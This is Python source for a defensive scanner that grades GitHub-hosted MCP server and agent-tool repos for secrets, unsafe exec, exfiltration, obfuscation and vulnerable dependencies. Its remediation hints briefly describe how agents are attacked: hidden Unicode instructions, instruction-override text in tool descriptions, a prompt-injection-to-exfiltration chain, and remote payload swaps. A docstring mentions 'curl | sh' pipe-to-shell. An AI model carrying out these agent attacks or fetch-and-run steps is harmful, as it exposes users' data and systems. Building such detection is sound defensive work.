"""Core MCP server security scanner.

Fetches source files from GitHub repos and scans for security issues.
Designed to run against the recruitment_prospects table of discovered repos.
"""
from __future__ import annotations

import hashlib
import json
import logging
import re
from dataclasses import dataclass, field
from pathlib import Path

import httpx

from src.scanner.patterns import (
    AGENT_METADATA_FILES,
    AUTH_POSITIVE_PATTERNS,
    DYNAMIC_REMOTE_LOAD_PATTERNS,
    EXEC_SINK_RE,
    EXFILTRATION_PATTERNS,
    EXTENSIONLESS_SCAN_FILES,
    FILE_READ_RE,
    FS_ACCESS_PATTERNS,
    INSECURE_DESERIALIZATION_PATTERNS,
    INSTALL_SCRIPT_DANGER_RE,
    INVISIBLE_UNICODE_PATTERNS,
    MANIFEST_EXEC_PATTERNS,
    NET_READ_RE,
    NPM_INSTALL_HOOKS,
    OBFUSCATION_PATTERNS,
    OUTBOUND_SEND_RE,
    PROMPT_INJECTION_PATTERNS,
    SECRET_PATTERNS,
    SENSITIVE_READ_RE,
    SKIP_DIRS,
    SKIP_EXTENSIONS,
    SOURCE_EXTENSIONS,
    UNSAFE_EXEC_PATTERNS,
    UNTRUSTED_INPUT_RE,
)

# Inline suppression marker — append to any line to skip scanning it
_SUPPRESSION_COMMENT = "ag-scan:ignore"

# Allowlist file path (JSON array of {file_path, name} objects to skip)
_ALLOWLIST_PATH = Path(__file__).parent / "allowlist.json"

logger = logging.getLogger(__name__)

_TIMEOUT = 30
_MAX_FILE_SIZE = 500_000  # 500KB — skip huge files
_MAX_FILES_PER_REPO = 200  # don't scan massive monorepos


_REMEDIATION_HINTS: dict[str, str] = {
    "secret": "Move to environment variable or secrets manager",
    "unsafe_exec": "Validate and sanitize input before execution",
    "fs_access": "Restrict paths to allowed directories",
    "exfiltration": "Add authentication to outbound data endpoints",
    "obfuscation": "Replace obfuscated code with readable equivalent",
    "dependency": "Update to a patched version or find an alternative package",
    "dynamic_remote_load": (
        "Pin remote payloads by commit SHA / content hash and never eval/exec fetched "
        "content — a mutable remote URL can be swapped after integration (rug-pull)"
    ),
    "hidden_unicode": (
        "Remove invisible/bidi/tag Unicode — it can smuggle instructions a human reviewer "
        "never sees (prompt injection)"
    ),
    "prompt_injection": (
        "Remove instruction-override / hidden-directive text from tool descriptions and "
        "metadata — it poisons the agent that reads the tool"
    ),
    "insecure_deserialization": (
        "Never deserialize untrusted data with pickle/marshal/dill/yaml.load — use a "
        "safe format (JSON) or yaml.safe_load / allow_pickle=False"
    ),
    "install_hook": (
        "Audit npm pre/post-install lifecycle scripts — they auto-run on `npm install` "
        "and are a top supply-chain vector; avoid fetching/executing remote content there"
    ),
    "toxic_flow": (
        "This tool combines private-data access, untrusted-input ingestion, and outbound "
        "send — the prompt-injection→exfiltration chain. Isolate the capabilities: don't "
        "let untrusted content reach an outbound path that can carry secrets"
    ),
}


@dataclass
class Finding:
    """A single security finding."""

    category: str  # "secret", "unsafe_exec", "fs_access"
    name: str
    severity: str  # "critical", "high", "medium", "low", "info"
    file_path: str
    line_number: int
    snippet: str  # surrounding context (redacted for secrets)
    remediation: str = ""  # actionable fix suggestion


@dataclass
class ScanResult:
    """Result of scanning one repository."""

    repo: str
    stars: int
    description: str
    framework: str
    findings: list[Finding] = field(default_factory=list)
    positive_signals: list[str] = field(default_factory=list)
    files_scanned: int = 0
    # Coverage disclosure (#4): total scannable files BEFORE the _MAX_FILES_PER_REPO cap,
    # and whether the signed grade is only a sample of the repo. Surfaced in the attestation
    # so a partial-coverage grade is never presented as an authoritative whole-repo verdict.
    total_scannable_files: int = 0
    sampled: bool = False
    has_readme: bool = False
    has_license: bool = False
    has_tests: bool = False
    primary_language: str = ""
    suppressed_count: int = 0  # lines with ag-scan:ignore
    trust_score: int = 0  # 0-100, computed after scan
    category_scores: dict[str, int] = field(default_factory=dict)  # per-category 0-100
    is_mcp_server: bool = False  # context-aware: MCP servers have expected tool patterns
    is_media_tool: bool = False  # context-aware: audio/TTS/video tools have expected fs patterns
    # #8 tool-definition pinning: canonical digest per agent/tool manifest, so a re-scan
    # can prove a tool definition drifted (rug-pull) even if the code still scans clean.
    tool_digests: dict[str, str] = field(default_factory=dict)  # path -> "sha256:..."
    tool_manifest_digest: str | None = None  # combined digest folded into the attestation
    # Phase 0/1 supply-chain: the recompute-discipline coverage block (surface,
    # scan_depth, db_snapshots, point_in_time) and the OSV/deps.dev summary. Both
    # are additive — a scan with the OSV pipeline disabled/unreachable leaves them
    # at their empty defaults and behaves exactly as before.
    coverage: dict = field(default_factory=dict)
    supply_chain: dict = field(default_factory=dict)
    # Phase 2 artifact scanning: repo↔artifact drift summary + a compact summary of
    # the published-artifact fetch/scan. Both stay empty for repo-only scans (the
    # feature is flag-gated), so existing behaviour is unchanged.
    drift: dict = field(default_factory=dict)
    artifact_scan: dict = field(default_factory=dict)
    # Phase 3 provenance verification summary (empty for scans without a verified
    # coordinate; flag-gated). Declared here so trust-score/service reads are safe
    # even when the provenance pass never runs.
    provenance: dict = field(default_factory=dict)
    # Phase 5 maintainer/behavioral signals summary (empty unless the flag is on;
    # GitHub-metadata only). Declared here so trust-score reads are safe even when
    # the maintainer pass never runs.
    maintainer: dict = field(default_factory=dict)
    # A+ "Certified" tier eligibility (roadmap §7): {eligible, checks{}}. Dormant
    # (eligible=False) until artifact-scan + provenance are enabled — that's the
    # design (A+ requires the cryptographic signals). Never lowers a grade.
    certified: dict = field(default_factory=dict)
    error: str | None = None

    @property
    def critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "critical")

    @property
    def high_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "high")

    @property
    def medium_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "medium")


def _should_skip_path(path: str) -> bool:
    """Check if a file path should be skipped."""
    parts = Path(path).parts
    for part in parts:
        if part in SKIP_DIRS:
            return True
    ext = Path(path).suffix.lower()
    if ext in SKIP_EXTENSIONS:
        return True
    # Also skip if it looks like a minified file
    name = Path(path).name.lower()
    if ".min." in name:
        return True
    return False


# Directory markers for throwaway / non-shipped lockfiles. A vuln in a monorepo's
# example app or test fixture must NOT drag down the grade of the package it
# actually publishes — those deps are never installed by a consumer of the tool.
_NON_PROD_DIR_MARKERS = frozenset({
    "example", "examples", "demo", "demos", "sample", "samples",
    "test", "tests", "__tests__", "e2e", "integration", "fixture", "fixtures",
    "benchmark", "benchmarks", "bench", "docs", "doc", "website", "site",
    "playground", "sandbox", "scripts", "tooling",
})


def _is_production_lockfile(path: str) -> bool:
    """True if a lockfile path looks like a shipped/production manifest, not an
    example/test/fixture one. Root-level lockfiles always count."""
    parts = [p.lower() for p in Path(path).parts[:-1]]  # dirs only
    return not any(p in _NON_PROD_DIR_MARKERS for p in parts)


# A finding in non-shipped code (tests, fixtures, examples, benchmarks, docs,
# scripts) is not the surface an agent connects to — it counts at a fraction of a
# shipped finding, so a large monorepo's test/fixture noise can't collapse the grade
# of what it actually ships. (This is why react-scale repos previously graded D.)
_NONSHIPPED_FINDING_WEIGHT = 0.15


def _is_nonshipped_path(path: str) -> bool:
    """True if the file lives under a non-shipped directory (test/fixture/example/
    benchmark/docs/scripts/…) — reuses the lockfile non-prod dir taxonomy."""
    parts = [p.lower() for p in Path(path).parts[:-1]]  # dirs only
    return any(p in _NON_PROD_DIR_MARKERS for p in parts)


def _finding_grade_weight(f) -> float:
    """Score weight for one finding: 1.0 for shipped code, a fraction for non-shipped."""
    return _NONSHIPPED_FINDING_WEIGHT if _is_nonshipped_path(f.file_path) else 1.0


def _is_source_file(path: str) -> bool:
    """Check if a file should be scanned for source patterns."""
    ext = Path(path).suffix.lower()
    if ext in SOURCE_EXTENSIONS:
        return True
    # Check extensionless files by name (Dockerfile, Makefile, etc.)
    filename = Path(path).name
    if filename in EXTENSIONLESS_SCAN_FILES:
        return True
    # Agent metadata files (SKILL.md etc.) — the tool's instruction surface
    return filename.lower() in AGENT_METADATA_FILES


def _redact_secret(line: str, match: re.Match) -> str:  # type: ignore[type-arg]
    """Redact the actual secret value from the snippet."""
    start, end = match.span()
    # Show first 4 and last 4 chars of match, redact middle
    matched = match.group()
    if len(matched) > 12:
        redacted = matched[:4] + "..." + matched[-4:]
    else:
        redacted = matched[:2] + "***"
    return line[:start] + redacted + line[end:]


def _detect_language(files: list[dict]) -> str:
    """Detect primary language from file extensions.

    Only counts *real programming-language* extensions (the keys of ``lang_map``) —
    config/data files (.json/.yaml/.toml/.ini/…) are NOT languages, so a TypeScript
    repo full of package.json/tsconfig.json no longer reports its primary language as
    ".json".
    """
    lang_map = {
        ".py": "Python", ".ipynb": "Python",
        ".js": "JavaScript", ".mjs": "JavaScript", ".cjs": "JavaScript",
        ".jsx": "JavaScript",
        ".ts": "TypeScript", ".tsx": "TypeScript",
        ".go": "Go", ".rs": "Rust", ".rb": "Ruby",
        ".java": "Java", ".kt": "Kotlin", ".cs": "C#",
        ".php": "PHP", ".swift": "Swift", ".scala": "Scala",
        ".lua": "Lua", ".pl": "Perl", ".pm": "Perl", ".r": "R",
        ".groovy": "Groovy",
        ".sh": "Shell", ".bash": "Shell", ".zsh": "Shell",
    }
    ext_counts: dict[str, int] = {}
    for f in files:
        ext = Path(f.get("path", "")).suffix.lower()
        if ext in lang_map:
            ext_counts[ext] = ext_counts.get(ext, 0) + 1

    if not ext_counts:
        return "unknown"
    top_ext = max(ext_counts, key=ext_counts.get)  # type: ignore[arg-type]
    return lang_map[top_ext]


def _tree_blobs(tree: list[dict]) -> list[dict]:
    """Keep only blob (file) entries under the per-file size cap."""
    return [
        item for item in tree
        if item.get("type") == "blob"
        and item.get("size", 0) <= _MAX_FILE_SIZE
    ]


async def _note_github(resp: httpx.Response, context: str) -> None:
    """Route a metered GitHub response through real-time rate-limit protection.

    Fires throttled admin alerts and maintains the ``github_budget_low``
    degradation flag off the response's ``X-RateLimit-*`` headers, and — when
    GitHub signals a 403/429 rate limit — backs off (honoring Retry-After /
    reset, capped by config) rather than hammering. Best-effort; never raises,
    so rate-limit protection can't itself break a scan.
    """
    try:
        from src.jobs.scan_health import note_github_response

        backoff = await note_github_response(
            resp.status_code, resp.headers, context=context,
        )
    except Exception:
        logger.debug("github rate-limit note failed", exc_info=True)
        return
    if backoff and backoff > 0:
        import asyncio

        from src.config import settings

        cap = getattr(settings, "scanner_ratelimit_backoff_cap_seconds", 5.0)
        await asyncio.sleep(min(backoff, cap))


async def _fetch_repo_tree(
    owner: str, repo: str, token: str | None = None,
) -> tuple[list[dict], bool, bool, str | None]:
    """Fetch the file tree of a repo via GitHub API.

    Returns ``(files, truncated, repo_ok, ref)``:

    - ``files``     — blob (file) entries under the per-file size cap.
    - ``truncated`` — GitHub could not return the *whole* tree. Very large
      monorepos (e.g. ``block/goose``, ``supabase-community/supabase-mcp``)
      come back with ``{"truncated": true}`` — a partial but real tree — or
      the recursive ``git/trees`` call errors outright. Either way the caller
      scans what WAS returned and flags the grade as *sampled* rather than an
      authoritative whole-repo verdict.
    - ``repo_ok``   — the repo metadata endpoint returned 200 (repo exists and
      is reachable). When False the repo is genuinely missing / private /
      unreachable and the caller surfaces a real error. When True but ``files``
      is empty we still SUCCEEDED — the caller degrades to a graceful (empty /
      partial) result instead of turning a big-monorepo tree failure into a 502.
    - ``ref``       — the repo's default branch, or ``None`` when the tree fetch
      failed. Threaded into :func:`_fetch_file_content` so bulk content reads can
      go through the unmetered ``raw.githubusercontent.com`` host.
    """
    headers = {"Accept": "application/vnd.github+json"}
    if token:
        headers["Authorization"] = f"token {token}"

    # follow_redirects: GitHub 301s a renamed/moved repo's API to its canonical
    # location (this is why facebook/react 502'd). Follow it so a moved repo still
    # scans instead of being mistaken for "not found".
    async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
        # Get default branch — this call also confirms the repo is real/public.
        try:
            resp = await client.get(
                f"https://api.github.com/repos/{owner}/{repo}",
                headers=headers,
            )
        except httpx.HTTPError as exc:
            logger.warning("GitHub repo API error for %s/%s: %s", owner, repo, exc)
            return [], False, False, None
        # Real-time rate-limit protection (metered call): alert + degrade flag.
        await _note_github(resp, f"repo metadata {owner}/{repo}")
        if resp.status_code != 200:
            logger.warning(
                "GitHub repo API returned %d for %s/%s (rate_remaining=%s, auth=%s)",
                resp.status_code, owner, repo,
                resp.headers.get("x-ratelimit-remaining", "?"),
                "yes" if token else "no",
            )
            return [], False, False, None
        default_branch = resp.json().get("default_branch", "main")

        tree_url = (
            f"https://api.github.com/repos/{owner}/{repo}/git/trees/{default_branch}"
        )

        # Recursive tree fetch. For very large monorepos GitHub may cap the
        # response (truncated:true) or error outright — either way the repo is
        # real, so we degrade to a partial/sampled tree, never a hard failure.
        resp = None
        try:
            resp = await client.get(
                tree_url, headers=headers, params={"recursive": "1"},
            )
        except httpx.HTTPError as exc:
            logger.warning("GitHub tree API error for %s/%s: %s", owner, repo, exc)

        if resp is not None:
            # Real-time rate-limit protection (metered call): alert + degrade flag.
            await _note_github(resp, f"repo tree {owner}/{repo}")

        if resp is not None and resp.status_code == 200:
            body = resp.json()
            return (
                _tree_blobs(body.get("tree", [])),
                bool(body.get("truncated")),
                True,
                default_branch,
            )

        if resp is not None:
            logger.warning(
                "GitHub tree API returned %d for %s/%s (rate_remaining=%s) — "
                "degrading to a shallow (root-level) sampled tree",
                resp.status_code, owner, repo,
                resp.headers.get("x-ratelimit-remaining", "?"),
            )

        # Fallback: a non-recursive (root-level) tree still yields a real, if
        # shallow, sample for a monorepo whose recursive tree was unavailable.
        # The repo is known-good (metadata returned 200), so this is a degraded
        # SUCCESS (truncated=True), not an error → no 502.
        try:
            shallow = await client.get(tree_url, headers=headers)
            # Real-time rate-limit protection (metered call): alert + degrade flag.
            await _note_github(shallow, f"repo shallow tree {owner}/{repo}")
            if shallow.status_code == 200:
                return (
                    _tree_blobs(shallow.json().get("tree", [])),
                    True,
                    True,
                    default_branch,
                )
        except httpx.HTTPError as exc:
            logger.warning(
                "GitHub shallow tree API error for %s/%s: %s", owner, repo, exc,
            )

        # No tree at all, but the repo exists — empty-but-successful result.
        return [], True, True, default_branch


async def _fetch_file_content(
    owner: str, repo: str, path: str, token: str | None = None,
    ref: str | None = None,
) -> str | None:
    """Fetch raw file content from GitHub.

    When ``ref`` is known and the raw-content optimization is enabled
    (``settings.scanner_use_raw_content``), fetch via ``raw.githubusercontent.com``
    first. That host is UNMETERED — it does not consume the GitHub API
    rate-limit budget — so routing the bulk per-file reads through it cuts the
    dominant ~1-API-call-per-file cost of a scan. Any non-200 (private repos
    404 on unauthenticated raw; transient raw misses) falls back to the
    authenticated Contents API so private/edge cases still resolve.
    """
    from src.config import settings

    async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
        # Unmetered fast path: raw.githubusercontent (public repos, no auth).
        if ref and getattr(settings, "scanner_use_raw_content", True):
            raw_url = (
                f"https://raw.githubusercontent.com/{owner}/{repo}/{ref}/{path}"
            )
            try:
                raw_resp = await client.get(raw_url)
                if raw_resp.status_code == 200:
                    return raw_resp.text
            except httpx.HTTPError:
                pass  # fall through to the authenticated Contents API

        # Authenticated Contents API fallback (private repos / raw 404s).
        headers = {"Accept": "application/vnd.github.raw+json"}
        if token:
            headers["Authorization"] = f"token {token}"
        resp = await client.get(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=headers,
        )
        # Real-time rate-limit protection (metered fallback): alert + degrade flag.
        await _note_github(resp, f"contents {owner}/{repo}/{path}")
        if resp.status_code == 200:
            return resp.text
    return None


def _load_allowlist() -> set[tuple[str, str]]:
    """Load the false-positive allowlist from disk.

    Returns a set of (file_path_glob, finding_name) tuples.
    Each entry suppresses the named finding for matching file paths.
    """
    if not _ALLOWLIST_PATH.exists():
        return set()
    try:
        data = json.loads(_ALLOWLIST_PATH.read_text())
        return {(e["file_path"], e["name"]) for e in data if "file_path" in e and "name" in e}
    except Exception:
        logger.warning("Failed to load scanner allowlist from %s", _ALLOWLIST_PATH)
        return set()


def _is_allowlisted(
    file_path: str, finding_name: str, allowlist: set[tuple[str, str]],
) -> bool:
    """Check if a finding is allowlisted.

    Supports exact match and simple glob patterns (* at end).
    """
    for pattern, name in allowlist:
        if name != finding_name:
            continue
        if pattern == file_path:
            return True
        # Simple glob: "src/utils/*" matches "src/utils/helpers.py"
        if pattern.endswith("*") and file_path.startswith(pattern[:-1]):
            return True
    return False


# ---------------------------------------------------------------------------
# Context-aware checks — reduce false positives for safe usage patterns
# ---------------------------------------------------------------------------

# Regex: subprocess.run/call/etc with a hardcoded string list as first arg
# e.g. subprocess.run(["git", "status"]) or subprocess.run("ls -la", ...)
_SAFE_SUBPROCESS_RE = re.compile(
    r"""subprocess\.(?:run|call|check_output|Popen)\s*\(\s*\[?\s*['"]""",
)

# Regex: subprocess with well-known safe commands (git, pip, npm, node, etc.)
_SAFE_SUBPROCESS_CMDS_RE = re.compile(
    r"""subprocess\.(?:run|call|check_output|Popen)\s*\(\s*\[\s*['"](git|pip|pip3|npm|npx|node|python|python3|go|cargo|make|cmake|docker|kubectl|terraform|helm|yarn|pnpm|mvn|gradle|rustc|gcc|g\+\+|clang|javac|ruby|bundle|rake|composer|dotnet|swift|xcodebuild|brew|apt|apt-get|yum|dnf|apk|conda|uv|ruff|black|isort|mypy|pytest|eslint|prettier|tsc|webpack|vite)['"]""",
)

# Regex: open() on a known safe path / with Path objects / read-only config
_SAFE_OPEN_PATTERNS = [
    # Path(...).open() or Path(...).read_text() / write_text()
    re.compile(r"Path\s*\(.*\)\s*\.(?:open|read_text|write_text|read_bytes|write_bytes)\s*\("),
    # open() with a hardcoded string path (no variable interpolation)
    re.compile(r"""open\s*\(\s*['"][^'"{}$]+['"]\s*[,)]"""),
    # with open(..., hardcoded path) as f — context manager with string literal path
    re.compile(r"""with\s+open\s*\(\s*['"][^'"{}$]+['"]"""),
]

# Config file extensions — reading these is almost always legitimate
_CONFIG_FILE_EXTENSIONS = frozenset({
    ".json", ".yml", ".yaml", ".toml", ".cfg", ".ini", ".conf",
    ".xml", ".properties", ".env.example", ".env.template",
})

# Safe write destinations — writing to these directories is expected behavior
_SAFE_WRITE_DIRS = frozenset({
    "logs", "log", "tmp", "temp", ".cache", "cache", "__pycache__",
    ".tmp", "output", "out", "build", "dist", ".build",
})

# Regex: open() reading a config file by extension
_CONFIG_FILE_READ_RE = re.compile(
    r"""open\s*\([^)]*['"][\w./\\-]+\.(?:json|ya?ml|toml|cfg|ini|conf|xml|properties)['"]""",
)

# Regex: writing to a known safe directory (logs/, tmp/, .cache/, etc.)
_SAFE_WRITE_DIR_RE = re.compile(
    r"""open\s*\([^)]*['"](/?(?:[\w.-]+/)*(?:logs?|tmp|temp|\.cache|cache|output|out|build|dist)/[^'"]+)['"]""",
)

# Regex: safe exec/eval — e.g. ast.literal_eval, json.loads with exec in name
_SAFE_EVAL_RE = re.compile(
    r"""(?:ast\.literal_eval|json\.loads?|yaml\.safe_load)\s*\(""",
)

# Regex: safe DB execute — db.execute(), session.execute(), conn.execute(), etc.
_SAFE_DB_EXEC_RE = re.compile(
    r"""(?:await\s+)?(?:\w+\.)?(?:db|session|conn(?:ection)?|cursor|engine|tx|transaction)\.exec(?:ute|utescalar|utemany)\s*\(""",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Known vulnerable dependency patterns (major CVEs / critical issues)
# Each: (package_name_pattern, vulnerable_version_pattern, severity, description)
# ---------------------------------------------------------------------------
_VER = r"\s*[=<>~!]=?\s*['\"]?"  # version operator shorthand

_VULN_DEPS: list[tuple[str, re.Pattern[str], str, str]] = [
    # -- Python packages --
    (
        "requests",
        re.compile(r"requests" + _VER + r"2\.\d{1,2}\b"),
        "high",
        "requests <2.31.0 leaks Proxy-Authorization header",
    ),
    (
        "urllib3",
        re.compile(r"urllib3" + _VER + r"1\.2[0-5]\b"),
        "high",
        "urllib3 <1.26.18 cookie/header leak",
    ),
    (
        "cryptography",
        re.compile(
            r"cryptography" + _VER
            + r"(3\d*\.|[012]\.|40\.|41\.0\.[012]\b)",
        ),
        "critical",
        "cryptography <41.0.3 OpenSSL vulnerabilities",
    ),
    (
        "pyjwt",
        re.compile(r"[Pp]y[Jj][Ww][Tt]" + _VER + r"[01]\."),
        "high",
        "PyJWT <2.0 algorithm confusion vulnerability",
    ),
    (
        "django",
        re.compile(r"[Dd]jango" + _VER + r"[0-3]\."),
        "critical",
        "Django <4.0 EOL with unpatched CVEs",
    ),
    (
        "flask",
        re.compile(r"[Ff]lask" + _VER + r"[01]\."),
        "high",
        "Flask <2.0 missing security fixes",
    ),
    (
        "pillow",
        re.compile(
            r"[Pp]illow" + _VER + r"(9\.[0-4]\.|[0-8]\.)",
        ),
        "high",
        "Pillow <9.5.0 buffer overflow CVEs",
    ),
    (
        "setuptools",
        re.compile(
            r"setuptools" + _VER + r"(6[0-4]\.|[0-5]\d?\.)",
        ),
        "medium",
        "setuptools <65.5.1 CVE-2022-40897 ReDoS",
    ),
    (
        "certifi",
        re.compile(r"certifi" + _VER + r"202[0-2]\."),
        "high",
        "certifi <2023.07.22 revoked e-Tugra root cert",
    ),
    (
        "aiohttp",
        re.compile(r"aiohttp" + _VER + r"3\.[0-8]\."),
        "high",
        "aiohttp <3.9.0 HTTP request smuggling CVEs",
    ),
    (
        "jinja2",
        re.compile(r"[Jj]inja2" + _VER + r"[0-2]\."),
        "high",
        "Jinja2 <3.0 sandbox escape vulnerabilities",
    ),
    (
        "sqlalchemy",
        re.compile(
            r"[Ss][Qq][Ll][Aa]lchemy" + _VER + r"1\.[0-3]\.",
        ),
        "medium",
        "SQLAlchemy <1.4 SQL injection edge cases",
    ),
    (
        "lxml",
        re.compile(r"lxml" + _VER + r"4\.[0-8]\."),
        "high",
        "lxml <4.9.1 CVE-2022-2309",
    ),
    (
        "paramiko",
        re.compile(r"paramiko" + _VER + r"[0-2]\."),
        "high",
        "paramiko <3.0 auth bypass / RCE vulnerabilities",
    ),
    (
        "pyyaml",
        re.compile(
            r"[Pp][Yy][Yy][Aa][Mm][Ll]" + _VER + r"[0-5]\.",
        ),
        "critical",
        "PyYAML <6.0 unsafe YAML deserialization",
    ),
    # -- Node.js packages --
    (
        "jsonwebtoken",
        re.compile(r'"jsonwebtoken"\s*:\s*"[\^~]?[0-7]\.'),
        "high",
        "jsonwebtoken <8.5.1 algorithm confusion",
    ),
    (
        "lodash",
        re.compile(r'"lodash"\s*:\s*"[\^~]?[0-3]\.'),
        "high",
        "lodash <4.17.21 prototype pollution",
    ),
    (
        "express",
        re.compile(r'"express"\s*:\s*"[\^~]?[0-3]\.'),
        "medium",
        "express <4.x EOL, missing security patches",
    ),
    (
        "axios",
        re.compile(r'"axios"\s*:\s*"[\^~]?0\.'),
        "medium",
        "axios 0.x SSRF and ReDoS vulnerabilities",
    ),
    (
        "node-fetch",
        re.compile(r'"node-fetch"\s*:\s*"[\^~]?[01]\.'),
        "medium",
        "node-fetch <2.6.7 CVE-2022-0235",
    ),
    (
        "minimist",
        re.compile(r'"minimist"\s*:\s*"[\^~]?[01]\.[0-1]\.'),
        "high",
        "minimist <1.2.6 prototype pollution",
    ),
    (
        "tar",
        re.compile(r'"tar"\s*:\s*"[\^~]?[0-5]\.'),
        "high",
        "tar <6.1.9 arbitrary file creation",
    ),
    (
        "got",
        re.compile(r'"got"\s*:\s*"[\^~]?[0-9]\.'),
        "medium",
        "got <11.8.5 open redirect vulnerability",
    ),
    (
        "shell-quote",
        re.compile(r'"shell-quote"\s*:\s*"[\^~]?1\.[0-6]\.'),
        "critical",
        "shell-quote <1.7.3 command injection",
    ),
    (
        "passport",
        re.compile(r'"passport"\s*:\s*"[\^~]?0\.[0-5]\.'),
        "high",
        "passport <0.6.0 session fixation",
    ),
]

# Dependency file names we parse
_DEP_FILES = frozenset({
    "requirements.txt", "pyproject.toml", "setup.py", "setup.cfg",
    "Pipfile", "package.json", "Cargo.toml", "Gemfile",
})


def _is_test_or_doc_file(file_path: str) -> bool:
    """Check if a file is a test, doc, or example file (lower severity)."""
    lower = file_path.lower()
    parts = Path(file_path).parts
    # Test directories and files
    if any(p in ("tests", "test", "spec", "__tests__", "testing") for p in parts):
        return True
    name = Path(file_path).stem.lower()
    if name.startswith("test_") or name.endswith("_test") or name.endswith("_spec"):
        return True
    if name == "conftest":
        return True
    # Doc / example directories
    if any(p in ("docs", "doc", "examples", "example", "samples") for p in parts):
        return True
    # Config examples
    if ".example" in lower or ".sample" in lower or ".template" in lower:
        return True
    return False


def _is_infra_file(file_path: str) -> bool:
    """Check if a file is CI/infra config (graded like tests/docs, not shipped code).

    Dockerfiles, `.github/**` / `.gitlab/**` workflow YAMLs, and agent skill configs
    (`.agents/**`) legitimately contain `RUN curl | sh`, pipe-to-shell, etc. Their
    findings are DOWNGRADED (same as tests/docs) so a single CI recipe can't produce
    the critical that zeroes an otherwise-clean repo's grade.
    """
    parts = Path(file_path).parts
    if any(p in (".github", ".gitlab", ".agents", ".circleci", ".buildkite") for p in parts):
        return True
    name = Path(file_path).name
    lname = name.lower()
    if name == "Dockerfile" or name.startswith("Dockerfile.") or lname.endswith(".dockerfile"):
        return True
    # Common root-level CI config files
    if lname in (".gitlab-ci.yml", ".travis.yml", "azure-pipelines.yml", "cloudbuild.yaml"):
        return True
    # Workflow YAMLs (e.g. under a workflows/ directory)
    if any(p == "workflows" for p in parts) and lname.endswith((".yml", ".yaml")):
        return True
    return False


# --- Per-file language dispatch (#2) -----------------------------------------
# Language-SPECIFIC pattern groups must only run on files of that language, so Python
# `exec()` no longer fires on `.mjs` and Ruby `system`/backtick no longer fires on TS
# template literals. Language-AGNOSTIC groups (secrets, exfiltration, invisible unicode,
# prompt injection) keep running on every file.
_EXT_TO_LANG: dict[str, str] = {
    ".py": "python", ".ipynb": "python",
    ".js": "javascript", ".mjs": "javascript", ".cjs": "javascript", ".jsx": "javascript",
    ".ts": "typescript", ".tsx": "typescript",
    ".rb": "ruby",
    ".go": "go",
    ".rs": "rust",
    ".java": "java",
}

# A pattern's NAME carries its language tag (e.g. "(Python)", "(Node.js)"); map those
# tags to the file-languages they apply to. Node runs both JS and TS.
_PATTERN_LANG_TAGS: list[tuple[str, frozenset]] = [
    ("python", frozenset({"python"})),
    ("node", frozenset({"javascript", "typescript"})),
    ("(js)", frozenset({"javascript", "typescript"})),
    ("ruby", frozenset({"ruby"})),
    ("(go)", frozenset({"go"})),
    ("rust", frozenset({"rust"})),
    ("java", frozenset({"java"})),
]


def _required_langs(pattern_name: str) -> frozenset:
    """Languages a pattern targets, inferred from its name. Empty = language-agnostic."""
    lname = pattern_name.lower()
    langs: set = set()
    for tag, mapped in _PATTERN_LANG_TAGS:
        if tag in lname:
            langs |= mapped
    return frozenset(langs)


def _lang_ok(pattern_name: str, file_lang: str | None) -> bool:
    """True if a (possibly language-specific) pattern should run on this file.

    Patterns whose name has no language tag are agnostic → always run. A tagged
    pattern runs only when the file's detected language is one it targets.
    """
    required = _required_langs(pattern_name)
    if not required:
        return True
    if file_lang is None:
        return False
    return file_lang in required


def _is_safe_exec_context(
    line: str, finding_name: str, file_path: str = "",
) -> bool:
    """Check if an unsafe_exec match is actually a safe usage pattern."""
    stripped = line.strip()
    filename = Path(file_path).name.lower() if file_path else ""

    # subprocess with hardcoded args → safe (but NOT if shell=True is present)
    if "subprocess" in finding_name.lower():
        has_shell_true = "shell=True" in stripped or "shell = True" in stripped
        if not has_shell_true and _SAFE_SUBPROCESS_RE.search(stripped):
            return True
        # subprocess with well-known safe commands (git, pip, npm, etc.)
        if not has_shell_true and _SAFE_SUBPROCESS_CMDS_RE.search(stripped):
            return True
        # Also safe: subprocess with shell=False (explicit)
        if "shell=False" in stripped or "shell = False" in stripped:
            return True
        # subprocess.run with capture_output (typically safe tooling)
        if "capture_output=True" in stripped and not has_shell_true:
            return True

    # eval/exec — skip if it's ast.literal_eval or similar safe wrappers
    if "eval" in finding_name.lower() or "exec" in finding_name.lower():
        if _SAFE_EVAL_RE.search(stripped):
            return True
        # db.execute(), session.execute(), conn.execute() — SQLAlchemy / DB calls
        if _SAFE_DB_EXEC_RE.search(stripped):
            return True
        # cursor.execute() — standard DB-API
        if "cursor" in stripped.lower() and "execute" in stripped.lower():
            return True
        # await exec(session, ...) — common DB helper wrapper pattern
        if re.search(r"""(?:await\s+)?exec\s*\(\s*(?:session|conn|db|cursor)""", stripped):
            return True
        # def exec(...) or async def exec(...) — function definition, not builtin exec
        if re.search(r"""(?:async\s+)?def\s+exec\s*\(""", stripped):
            return True

    # eval() in __init__.py — commonly used for version parsing, e.g. eval(f.read())
    if "eval" in finding_name.lower() and filename == "__init__.py":
        # Only safe if it looks like version extraction
        if re.search(r"""(?:version|__version__|VERSION)""", stripped, re.IGNORECASE):
            return True

    # exec() in migration files or setup.py — expected usage
    if "exec" in finding_name.lower():
        parts = Path(file_path).parts if file_path else ()
        is_migration = any(
            p in ("migrations", "alembic", "versions", "migrate")
            for p in parts
        )
        is_setup = filename in ("setup.py", "setup.cfg", "conftest.py")
        if is_migration or is_setup:
            return True

    return False


def _is_safe_fs_context(
    line: str, _finding_name: str, file_path: str = "",
) -> bool:
    """Check if a file system access match is actually a safe usage pattern."""
    stripped = line.strip()

    for safe_pat in _SAFE_OPEN_PATTERNS:
        if safe_pat.search(stripped):
            return True

    # Path.write_text / read_text (already method-chained on Path object)
    if re.search(r"\.(?:read_text|write_text|read_bytes|write_bytes)\s*\(", stripped):
        return True

    # Reading config files by extension — almost always legitimate
    if _CONFIG_FILE_READ_RE.search(stripped):
        return True

    # Writing to known safe directories (logs/, tmp/, .cache/, etc.)
    if _SAFE_WRITE_DIR_RE.search(stripped):
        return True

    # open() with a string literal filename containing a config extension
    # e.g. open("settings.toml"), open("config.yml")
